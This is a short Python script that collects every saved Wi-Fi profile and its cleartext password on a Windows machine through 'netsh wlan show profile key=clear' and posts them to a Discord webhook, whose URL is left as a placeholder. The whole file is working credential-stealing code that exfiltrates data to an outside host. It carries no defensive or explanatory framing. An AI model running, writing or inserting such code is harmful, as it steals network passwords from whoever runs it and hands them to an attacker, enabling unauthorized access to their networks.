import subprocess
import requests

# Function to get Wi-Fi passwords
def get_wifi_password():
    try:
        result = subprocess.check_output(['netsh', 'wlan', 'show', 'profile'])
        profiles = [line.decode('utf-8').split(':')[1].strip() for line in result.splitlines() if b'All User Profile' in line]
        passwords = {}
        for profile in profiles:
            try:
                password_result = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'])
                password_lines = [line.decode('utf-8').strip() for line in password_result.splitlines()]
                key_content_line = [line for line in password_lines if "Key Content" in line]
                if key_content_line:
                    password = key_content_line[0].split(':')[1].strip()
                    passwords[profile] = password
                else:
                    passwords[profile] = "Password not found"
            except subprocess.CalledProcessError:
                passwords[profile] = "Password not found"
        return passwords
    except Exception as e:
        return f"Error: {e}"

# Function to send data to Discord server using webhook
def send_discord(data):
    webhook_url = "https://ur-discord-webhook"
    headers = {
        "Content-Type": "application/json"
    }
    payload = {
        "content": data
    }
    response = requests.post(webhook_url, json=payload, headers=headers)

if __name__ == "__main__":
    wifi_passwords = get_wifi_password()
    if isinstance(wifi_passwords, dict):
        # Sending passwords to Discord server
        data = "\n".join([f"WiFi Profile: {profile}, Password: {password}" for profile, password in wifi_passwords.items()])
        send_discord(data)

